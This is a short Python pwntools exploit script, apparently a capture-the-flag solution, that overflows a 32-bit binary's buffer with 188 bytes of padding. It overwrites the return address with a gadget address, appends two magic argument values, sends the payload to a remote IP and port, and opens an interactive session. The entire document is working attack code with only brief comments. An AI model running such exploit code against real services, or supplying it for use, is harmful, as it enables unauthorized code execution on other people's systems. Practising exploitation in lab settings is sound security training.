from pwn import *

# Example values (adjust according to your binary and gadgets)
offset = 188  # Offset to return address (you'll get this from gdb)
rop_gadget_address = 0x80491e2  # Example address of the ROP gadget

# Construct the payload
payload = b'A' * offset  # Padding to overflow the buffer
payload += p32(rop_gadget_address)  # Overwrite the return address with the gadget address
payload += b'B'*4
a= -0x21524111
b= -0x3f212ff3
payload += p32(a & 0xffffffff)
payload += p32(b & 0xffffffff)
# Remote instance details
host = "94.237.62.184"
port = 48850

# Connect to the remote instance
p = remote(host, port)

p.sendline(payload)
p.interactive()

